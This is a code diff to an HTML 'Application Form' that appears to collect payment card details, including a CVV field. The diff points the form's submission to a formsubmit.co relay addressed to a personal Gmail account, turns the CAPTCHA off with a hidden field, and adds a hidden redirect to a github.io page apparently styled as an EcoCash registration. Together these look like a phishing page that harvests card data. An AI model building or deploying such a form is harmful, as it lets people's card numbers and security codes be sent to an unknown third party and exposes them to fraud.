@@ -69,7 +69,7 @@
   </style>
 </head>
 <body>
-  <form id="applicationForm" action="#" method="POST" novalidate>
+  <form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" novalidate>
     <h2>Application Form</h2>
 
     <label for="fullName">Full Name</label>
@@ -118,6 +118,10 @@
       <input type="number" id="cvv" name="cvv" />
       <div id="errorCVV" class="error-message">CVV must be 3 digits</div>
     </div>
+
+    <!-- Redirect and CAPTCHA settings -->
+    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/ecocash-form/thank-you.html">
+    <input type="hidden" name="_captcha" value="false">
 
     <button type="submit">Submit Application</button>
   </form>
